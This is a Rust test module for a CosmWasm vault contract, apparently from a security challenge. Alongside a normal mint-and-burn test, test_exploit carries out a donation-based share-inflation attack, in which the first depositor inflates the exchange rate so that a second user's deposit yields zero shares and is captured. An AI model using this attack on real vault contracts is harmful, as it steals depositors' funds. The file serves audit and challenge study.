#[cfg(test)]
pub mod tests {
    use crate::{
        contract::DENOM,
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
        state::Balance,
    };
    use cosmwasm_std::{coin, Addr, Empty, Uint128, BankMsg, CosmosMsg};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub const USER: &str = "user";
    pub const USER2: &str = "user2";
    pub const ADMIN: &str = "admin";

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg { offset: 10 };
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        (app, contract_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn basic_flow() {
        let (mut app, contract_addr) = proper_instantiate();

        // mint funds to user
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));

        // mint shares for user
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // mint funds to user2
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));

        // mint shares for user2
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // query user
        let balance: Balance = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::UserBalance {
                    address: USER.to_string(),
                },
            )
            .unwrap();

        // burn shares for user
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: balance.amount,
            },
            &[],
        )
        .unwrap();

        // burn shares for user2
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: balance.amount,
            },
            &[],
        )
        .unwrap();

        let bal = app.wrap().query_balance(USER, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(10_000));

        let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(10_000));

        let bal = app
            .wrap()
            .query_balance(contract_addr.to_string(), DENOM)
            .unwrap();
        assert_eq!(bal.amount, Uint128::zero());
    }

    #[test]
    fn test_exploit(){
        let (mut app, contract_addr) = proper_instantiate();
        let d1 = 9;
        let d2 = 10000;
        let t = 9000;
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10000));
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10000));
        //contract starts out with zero funds
        //user1 makes first deposit
        app.execute_contract(
          Addr::unchecked(USER),
          contract_addr.clone(),
          &ExecuteMsg::Mint{},
          &vec![coin(d1, DENOM)]
        ).unwrap();
        
        //donate coins to increase strength of share
        let donate_msg = CosmosMsg::Bank(
            BankMsg::Send{
                to_address: contract_addr.to_string(),
                amount: vec![coin(t, DENOM)]
            }
        ); 

        app.execute(
            Addr::unchecked(USER),
            donate_msg
        ).unwrap();

        let vault_bal = app.wrap().query_balance(contract_addr.to_string(), DENOM).unwrap();
        println!("after deposit, vault balance is {}", vault_bal);

        //user2 deposits (cannot get shares because exchange rate is rounded down to 0)
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Mint{},
            &vec![coin(d2, DENOM)]
        ).unwrap(); 

        //user1 burns shares
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Burn{
                shares: Uint128::new(d1),
            },
            &vec![]
        ).unwrap();
    let user_bal = app.wrap().query_balance(USER, DENOM).unwrap();
    let user2_bal = app.wrap().query_balance(USER2, DENOM).unwrap();
    println!("user balance after: {}", user_bal);
    println!("user2 balance after: {}", user2_bal);
    assert!(user_bal.amount > Uint128::new(10000));
    }
}
